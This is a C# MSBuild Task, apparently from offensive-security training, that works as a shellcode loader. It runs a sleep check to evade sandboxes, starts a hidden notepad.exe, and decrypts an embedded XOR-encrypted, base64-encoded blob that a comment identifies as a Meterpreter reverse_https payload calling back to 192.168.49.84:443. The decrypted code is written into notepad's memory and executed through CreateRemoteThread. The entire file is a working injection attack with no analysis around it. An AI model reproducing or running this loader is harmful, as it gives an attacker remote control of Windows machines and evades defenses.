using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

namespace MSBuild
{
    public class ClassExample : Task, ITask
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect,
            uint nddPreferred);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        static byte[] XByteArray(byte[] inputBytes, string key)
        {
            byte[] result = new byte[inputBytes.Length];
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            // For each input byte
            for (int i = 0; i < inputBytes.Length; i++)
            {
                // XOR next bytes from input and key byte arrays
                result[i] = (byte)(inputBytes[i] ^ (byte)keyBytes[i % key.Length]);
            }
            return result;
        }

        public override bool Execute()
        {
            // Fetch current time, sleep two seconds, and exit if two seconds haven't actually elapsed
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            // Get PID of notepad.exe for our user and get a handle on the remote process
            ProcessStartInfo startInfo = new ProcessStartInfo("C:\\Windows\\SysWOW64\\notepad.exe");
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process notepadProcess = Process.Start(startInfo);
            int iTargetPid = notepadProcess.Id;
            IntPtr pTargetProcessHandle = OpenProcess(0x001F0FFF, false, iTargetPid);

            // Allocate remote process memory
            IntPtr addr = VirtualAllocExNuma(pTargetProcessHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);

            // Decode and decrypt
            // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.84 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -f raw -o met.bin
            // XorEncryptDecrypt.exe ./met.bin 'MyS3cr3tK3y' ./xor.bin
            string encBytes = "lKnt2PK5IK0/F40WUJqCx0NAbMjwfU4KrEBdnSSIiiOeLoqRsIvT4bZB/TiVJtBCCF8/P9/ugqw1gPA53kHM69MtzBOmpqVOQw3R2oiacs50h1hCuB9mjV9ZusQh60nLMaJcLQIlY8p9dx6elUb122qlkwamo3dKnV2DMaAJiizX47GCa1Z3vPP55ygNbKNkdFTMz7AAj27W6sAHkgS2V1sV+LvsPGInAJr8UDdJYvVT7JMltxdG2jY7lUlsy6rhkOzHsQQ1ItfHEwQcKbM88QzwZ+PWQ7xOr9kDLznDDfF2Od9e7NRLUGBqOyJDeHOu77zus3oHH1xGTkFZPcal6byoPuHQJZ4aEmuVN/zOEfmtqNWpMuQLZ0pXofqM82hXvbhG3AzIHPAMqbQh9jq1xc9jOddnujEXpCvp5AUe62Z89m922i7lqFnK8f6WrA5Zv1vvyQRl7sSD4T5j/hXTrvdGGR1qhDZqU5blse9etQxX7A4CntMAng4+tLPbiDBpWYaS3EUc0o9FTFNwv+OKjl5Em6VC3VcgXznwZPgwLfx/70pcQTSiisPmPP608GoBJiXd1F7EDSm64fwDzUVyo2/TiGLec7VBBxBdmw+RnWWolj0keSx+yGS99J/iIkxi/3l8g3DMrF/1TlPerNlvuD0uGqvwyg40MixjUJ6B5okFzrihWwPaoQEeKTDPKQJ+pnGKYgDKkLe+joDi00FiZVaLJ/X8RMNCvIRGXlRQDZ9mQs/KDBORnr4J1wF5JKYlF0fGgj/25LsN1m7Hbm6OUgrbmnTBPTKkcK0qChJUSDwwaFE1RZ+t5TgmvScR0wDb9+cvpYYbQgFyugoP9D3i71Ki4p5nu64L3/mPD7+j7MsxIvCD/depS1M9yhV6eTxr03XloL6mo4o=";
            string key = "MyS3cr3tK3y";
            byte[] buf = XByteArray(Convert.FromBase64String(encBytes), key);

            // Write buf to memory allocation
            IntPtr outSize;
            WriteProcessMemory(pTargetProcessHandle, addr, buf, buf.Length, out outSize);

            // Create a thread in the remote process and execute code in buf
            IntPtr hThread = CreateRemoteThread(pTargetProcessHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return true;
        }
    }
}
